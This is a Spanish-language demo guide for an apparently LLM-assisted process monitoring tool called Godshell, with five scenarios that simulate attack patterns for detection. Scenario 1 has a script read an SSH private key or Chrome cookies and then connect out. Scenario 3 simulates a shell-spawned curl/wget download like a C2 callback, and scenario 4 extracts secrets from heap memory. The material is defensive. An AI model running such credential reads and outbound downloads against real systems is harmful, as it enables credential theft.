# Godshell — 5 Escenarios de Demo

> Cada escenario está diseñado para ser reproducible en tu entorno local.
> Todos asumen que `sudo ./godshell` ya está corriendo y observando.

---

## Escenario 1 — El Ladrón de Credenciales Silencioso

**Concepto:** Un proceso "legítimo" lee tu llave SSH privada y abre una conexión de red inmediatamente después. Sin Godshell, esto pasa completamente desapercibido. Con Godshell, el LLM correlaciona ambos eventos en el mismo proceso y levanta la bandera.

### Setup

```bash
# Simula un exfiltrador de credenciales en Python
cat > /tmp/exfil_sim.py << 'EOF'
import time, socket, os

# Paso 1: Lee la llave privada SSH (simula acceso a credenciales)
try:
    with open(os.path.expanduser("~/.ssh/id_rsa"), "r") as f:
        data = f.read(128)  # Solo los primeros bytes
        print(f"[sim] Read {len(data)} bytes from id_rsa")
except FileNotFoundError:
    # Si no tienes llave SSH, lee algo equivalentemente sensible
    with open(os.path.expanduser("~/.config/google-chrome/Default/Cookies"), "rb") as f:
        data = f.read(128)
        print(f"[sim] Read {len(data)} bytes from Chrome cookies")

time.sleep(1)

# Paso 2: Abre una conexión TCP externa (simula exfiltración)
try:
    s = socket.create_connection(("1.1.1.1", 443), timeout=3)
    print("[sim] Connection established to 1.1.1.1:443")
    s.close()
except Exception as e:
    print(f"[sim] Connection attempt: {e}")

print("[sim] Exfil simulation complete. Sleeping...")
time.sleep(30)  # Mantiene el proceso vivo para que Godshell lo capture
EOF

python3 /tmp/exfil_sim.py &
```

### Lo que verás en Godshell

```
# En Godshell, toma un snapshot (s) y luego pregunta:
> s

# Luego al LLM:
> que proceso es sospechoso en este snapshot?

# El LLM debería correlacionar:
# - python3 abrió ~/.ssh/id_rsa (o Cookies)
# - python3 conectó a 1.1.1.1:443
# - Ambos eventos en el mismo PID, dentro de segundos uno del otro
# y marcarlo como indicador de exfiltración

# Para confirmar manualmente:
> i <pid_de_python3>
```

### Por qué es fascinante

La correlación `archivo sensible → conexión externa` en el mismo proceso es el patrón de exfiltración más común en incidentes reales. Herramientas como `top` o `ps` son completamente ciegas a esto. Godshell lo captura porque rastrea _efectos_, no solo estado.

---

## Escenario 2 — Diagnóstico de CPU: El Loop Infinito Disfrazado

**Concepto:** Una app está consumiendo CPU al 100% pero `top` solo te dice el PID. Godshell + `trace` te dice exactamente qué syscall está spammeando, en 5 segundos, sin tocar el proceso.

### Setup

```bash
# Opción A: CPU spinner puro (simula un bug de busy-wait)
cat > /tmp/cpu_spinner.py << 'EOF'
import time

print(f"[spinner] PID: {__import__('os').getpid()}")
print("[spinner] Spinning forever on a tight loop...")

# Simula un bug clásico: polling sin sleep
counter = 0
while True:
    counter += 1
    if counter % 10_000_000 == 0:
        # Simula que "hace algo" cada N iteraciones
        with open("/tmp/spinner_checkpoint", "w") as f:
            f.write(str(counter))
EOF

python3 /tmp/cpu_spinner.py &
SPINNER_PID=$!
echo "Spinner PID: $SPINNER_PID"

# Opción B: I/O poller (simula un proceso esperando en un lock)
cat > /tmp/io_poller.py << 'EOF'
import os, time

print(f"[poller] PID: {os.getpid()}")
print("[poller] Polling /proc/loadavg in a tight loop...")

while True:
    with open("/proc/loadavg") as f:
        f.read()
    # Sin sleep = simula polling agresivo
EOF

python3 /tmp/io_poller.py &
POLLER_PID=$!
echo "Poller PID: $POLLER_PID"
```

### Lo que verás en Godshell

```
# Toma snapshot, identifica el proceso con alto CPU
> s

# Luego en snapshot mode:
> t <pid_del_spinner>

# Para el spinner puro, strace mostrará:
# - write() al checkpoint dominando el tiempo
# - 0% tiempo en kernel = es CPU userspace puro

# Para el io_poller, strace mostrará:
# - openat() + read() en tight loop
# - Miles de llamadas por segundo a /proc/loadavg

# Pregúntale al LLM:
> por que este proceso está usando tanto CPU?
```

### Por qué es fascinante

`strace -c` en 5 segundos genera un histograma que distingue instantáneamente entre:

- **Busy-wait en userspace** → el problema está en el código, no en el OS
- **I/O polling sin backoff** → necesita `time.sleep()` o `inotify`
- **Lock contention** → dominated by `futex` syscalls

Un senior tarda 10 minutos llegando a esta conclusión manualmente. Godshell lo entrega en 5 segundos.

---

## Escenario 3 — La Cadena de Spawning Sospechosa

**Concepto:** Simula el patrón clásico de un exploit exitoso: `nginx` spawna `bash` spawna `curl` descargando algo. El árbol de familia de Godshell hace visible esta cadena de inmediato.

### Setup

```bash
# Simula la cadena: proceso_padre → shell inesperado → descargador
# Este es el patrón post-explotación más común en CTFs y breaches reales

cat > /tmp/chain_sim.sh << 'EOF'
#!/bin/bash

# Nivel 1: "El servidor web" (proceso que no debería spawnear shells)
echo "[chain] Simulating webserver process (PID: $$)"
sleep 60 &
WEBSERVER_PID=$!

# Nivel 2: "El shell inesperado" (como si fuera RCE)
bash -c "
    echo '[chain] Unexpected shell spawned from webserver'
    # Nivel 3: Descargador (simula wget/curl a C2)
    curl -s --max-time 3 https://example.com -o /tmp/payload_sim 2>/dev/null || \
    wget -q --timeout=3 https://example.com -O /tmp/payload_sim 2>/dev/null || \
    python3 -c \"import urllib.request; urllib.request.urlretrieve('https://example.com', '/tmp/payload_sim')\" 2>/dev/null
    echo '[chain] Download attempted'
    sleep 45
" &
SHELL_PID=$!

echo "Webserver PID: $WEBSERVER_PID"
echo "Shell PID: $SHELL_PID"
wait
EOF

chmod +x /tmp/chain_sim.sh
bash /tmp/chain_sim.sh &
```

### Lo que verás en Godshell

```
# Toma snapshot
> s

# En el snapshot verás bash con parent: bash (que a su vez tiene parent: tu shell)
# Identifica el PID del curl/wget y sube la cadena:
> f <pid_del_curl>

# Esto te muestra:
# tu_shell (PPID)
#   └── bash [chain_sim]
#         └── bash [shell_inesperado] [TARGET]
#               └── curl

# Pregúntale al LLM:
> hay algo sospechoso en el arbol de procesos del snapshot?

# El LLM debería identificar:
# bash spawneando curl después de conectar a internet =
# patrón clásico de C2 callback
```

### Por qué es fascinante

El comando `family` aísla exactamente la cadena relevante sin mostrarte los 200 procesos del sistema. En un incident response real, esto reduce de horas a segundos el tiempo para identificar el punto de entrada.

---

## Escenario 4 — Lectura de Memoria de Proceso Vivo

**Concepto:** Un proceso Python tiene una "contraseña" en memoria. Usando `maps` para encontrar las regiones heap, y `read mem` para extraerla, Godshell demuestra que los secretos en memoria no son secretos para el kernel.

### Setup

```bash
# Proceso que mantiene un "secreto" en memoria
cat > /tmp/secret_keeper.py << 'EOF'
import os, time, ctypes

pid = os.getpid()
print(f"[secret] PID: {pid}")

# Simula una aplicación que tiene credenciales en memoria
# (como haría cualquier servidor web con su DB password)
SECRET_TOKEN = "API_KEY_GODSHELL_DEMO_12345_SECRET"
DB_PASSWORD  = "postgres_password_never_stored_on_disk"

# Mantén referencias para que no sean garbage collected
secrets = [SECRET_TOKEN, DB_PASSWORD]

print(f"[secret] Secrets are live in heap memory")
print(f"[secret] Hint: search for 'GODSHELL_DEMO' in process memory")
print(f"[secret] Maps will show you where the heap is")

# Mantén vivo
while True:
    time.sleep(5)
    print(f"[secret] Still alive, secrets in memory...")
EOF

python3 /tmp/secret_keeper.py &
SECRET_PID=$!
echo "Secret keeper PID: $SECRET_PID"
```

### Lo que verás en Godshell

```
# Paso 1: Encuentra las regiones de memoria del proceso
> m <SECRET_PID>

# Verás output como:
# ADDRESS RANGE                   PERMS  SIZE       PATH
# 55f3a2000000-55f3a2021000        r-x    132 KB    /usr/bin/python3.12
# 7f8b14000000-7f8b16000000        rwx    32 MB     [heap]    ← AQUÍ
# 7f8b20000000-7f8b20021000        rw-    132 KB    [stack]

# Paso 2: Lee la región heap buscando el secreto
# Usa la dirección de inicio del heap que viste en maps:
> r <SECRET_PID> <heap_start_address> 4096

# En el hex dump verás la string ASCII "GODSHELL_DEMO" o "postgres_password"
# en texto plano dentro del heap

# Pregúntale al LLM:
> que secretos puedes encontrar en la memoria de este proceso?
# (primero darle el output de maps, luego de read mem)
```

### Por qué es fascinante

Esto demuestra visualmente por qué "en memoria es seguro" es un mito. Cualquier proceso con los permisos adecuados puede leer `/proc/<pid>/mem`. En RE y análisis de malware, este es el método para extraer claves de cifrado, tokens OAuth y passwords de procesos que nunca los escriben a disco.

---

## Escenario 5 — El Proceso Fantasma: Detección de Binario Modificado

**Concepto:** Compila godshell, ejecútalo, luego modifica (o elimina) el binario en disco mientras sigue corriendo. Godshell aparece como `(deleted)` en su propio snapshot — exactamente como aparece malware que se auto-elimina después de cargar en memoria para no dejar rastro en disco.

### Setup

```bash
# Este escenario usa el propio godshell como sujeto.
# Ya lo viste en tu snapshot: godshell (deleted) (99537)
# Pero aquí lo reproducimos con un binario custom para que sea más obvio.

# Paso 1: Compila un proceso que dure mucho
cat > /tmp/ghost_process.c << 'EOF'
#include <stdio.h>
#include <unistd.h>

int main() {
    printf("[ghost] Running as PID: %d\n", getpid());
    printf("[ghost] Binary is currently at /tmp/ghost_process\n");
    printf("[ghost] Delete the binary now — I'll keep running from memory\n");
    fflush(stdout);

    for(int i = 0; ; i++) {
        sleep(5);
        printf("[ghost] Still alive, iteration %d (binary may be deleted from disk)\n", i);
        fflush(stdout);
    }
    return 0;
}
EOF

gcc /tmp/ghost_process.c -o /tmp/ghost_process
/tmp/ghost_process &
GHOST_PID=$!
echo "Ghost PID: $GHOST_PID"

sleep 2

# Paso 2: Elimina el binario del disco mientras sigue corriendo en memoria
# Este es exactamente el patrón de malware fileless
rm /tmp/ghost_process
echo "[demo] Binary deleted from disk. Process is now 'fileless'."
echo "[demo] Check /proc/$GHOST_PID/exe — it will show '(deleted)'"
ls -la /proc/$GHOST_PID/exe 2>/dev/null && echo "(verify above shows deleted)"
```

### Lo que verás en Godshell

```
# Toma snapshot DESPUÉS de eliminar el binario
> s

# El proceso aparece como:
# ghost_process///tmp/ghost_process (deleted) (GHOST_PID) parent:zsh

# Inspecciona:
> i <GHOST_PID>

# Verás:
# Binary: /tmp/ghost_process (deleted)   ← está en memoria, no en disco
# State: ACTIVE

# Intenta leer el binario desde memoria:
> m <GHOST_PID>
# Busca la región r-xp del binario principal

> r <GHOST_PID> <texto_segment_address> 512
# Verás el ELF header: 7f 45 4c 46 (magic bytes de ELF)
# El binario completo sigue en memoria aunque no existe en disco

# Pregúntale al LLM:
> hay procesos con binarios eliminados en el snapshot? que implica eso?
```

### Por qué es fascinante

`(deleted)` en `/proc/<pid>/exe` es un IOC (Indicator of Compromise) de primer nivel en forensics. Malware moderno como algunos rootkits y droppers se auto-eliminan del disco después de cargar para evadir detección por scanners de archivos. Godshell lo detecta pasivamente sin ninguna regla configurada — simplemente porque captura el estado real del kernel.

---

## Limpieza

```bash
# Mata todos los procesos de demo
kill $SPINNER_PID $POLLER_PID $GHOST_PID $SECRET_PID 2>/dev/null
pkill -f "exfil_sim\|cpu_spinner\|io_poller\|chain_sim\|secret_keeper\|ghost_process" 2>/dev/null
rm -f /tmp/exfil_sim.py /tmp/cpu_spinner.py /tmp/io_poller.py \
      /tmp/chain_sim.sh /tmp/secret_keeper.py /tmp/ghost_process.c \
      /tmp/payload_sim /tmp/spinner_checkpoint
echo "Demo cleanup complete."
```

---

## Resumen de Capacidades por Escenario

| Escenario           | Tools usadas        | Concepto demostrado                |
| ------------------- | ------------------- | ---------------------------------- |
| 1. Exfil silenciosa | `inspect`, `search` | Correlación archivo sensible → red |
| 2. CPU spinner      | `trace`, `inspect`  | Diagnóstico de syscall en 5s       |
| 3. Spawn chain      | `family`, `search`  | Detección de cadena post-exploit   |
| 4. Secretos en heap | `maps`, `read mem`  | Memory forensics de proceso vivo   |
| 5. Binario fantasma | `inspect`, `maps`   | Detección de fileless malware      |
